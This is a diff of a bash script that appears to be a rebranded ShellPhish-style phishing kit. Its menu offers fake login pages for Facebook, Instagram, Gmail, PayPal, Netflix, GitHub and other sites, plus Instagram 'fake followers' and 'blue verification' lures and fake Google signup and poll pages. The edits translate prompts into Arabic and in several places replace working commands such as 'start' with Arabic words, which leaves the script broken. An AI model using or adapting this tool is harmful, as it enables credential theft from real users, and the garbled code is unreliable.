@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# cory phising  v2.5-Mod
+# cory phising  v1.5-Mod
 # Moded by @cory
 
 # تاج راسكم العرب 
@@ -79,10 +79,10 @@ printf "\e[1;92m  _____) )| | | |( (/ / | || || |      cory by devloper ls to  \
 printf "\e[1;92m (/ .........|_| |_| \____)|_||_||_| ...     |_| |_||_|(___/ |_| |_| \e[0m\n"
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @corbxsy \e[0m\e[1;93m.:.:.\e[0m\n\n"
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: Disclaimer: Developers cory   ::\e[0m\n"
 printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
 printf " \n"
-printf " \e[36;1m.:. Choose any social site which you want to hack .:.\e[0m\n"
+printf " \e[36;1m.:. اختر رقم تطبيقك الي تحتاج تهكر فيه عنطريق رقم .:.\e[0m\n"
 printf " \n"
 }
 
@@ -102,20 +102,20 @@ printf " \e[1;31m[\e[0m\e[1;77mST\e[0m\e[1;31m]\e[0m\e[1;93m Termux Setup \e[1;3
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
-facebook
+فيسبوك
 elif [[ $option == 2 || $option == 02 ]]; then
-instagram
+انستجرام
 elif [[ $option == 3 || $option == 03 ]]; then
-gmail
+جيميل قوقل
 elif [[ $option == 4 || $option == 04 ]]; then
 server="microsoft"
 start
 elif [[ $option == 5 || $option == 05 ]]; then
 server="netflix"
-start
+يبدأ
 elif [[ $option == 6 || $option == 06 ]]; then
 server="paypal"
-start
+يبدأ
 elif [[ $option == 7 || $option == 07 ]]; then
 server="steam"
 start
@@ -127,10 +127,10 @@ server="playstation"
 start
 elif [[ $option == 10 ]]; then
 server="github"
-start
+يبدأ
 elif [[ $option == 11 ]]; then
 server="twitch"
-start
+يبدأ
 elif [[ $option == 12 ]]; then
 server="pinterest"
 start
@@ -202,7 +202,7 @@ dependencies
 menu
 elif [[ $option == SL || $option == sl ]]; then
 clear
-printf "\n\e[1;92mRunning Linux Setup "
+printf "\n\e[1;92mRunning لينكس ينفع"
 sleep 0.5
 printf "."
 sleep 0.5
@@ -272,10 +272,10 @@ if [[ $option == 1 || $option == 01 ]]; then
 server="instagram"
 start
 elif [[ $option == 2 || $option == 02 ]]; then
-server="ig_followers"
+server="صفحه متابعين وهمين"
 start
 elif [[ $option == 3 || $option == 03 ]]; then
-server="ig_verify"
+server="صفحه توثيق ازرق"
 start
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
@@ -295,10 +295,10 @@ if [[ $option == 1 || $option == 01 ]]; then
 server="google"
 start
 elif [[ $option == 2 || $option == 02 ]]; then
-server="google_new"
+server="صفحه انشاء حساب قوقل"
 start
 elif [[ $option == 3 || $option == 03 ]]; then
-server="google_poll"
+server="صفحه تصويت قوقل"
 start
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
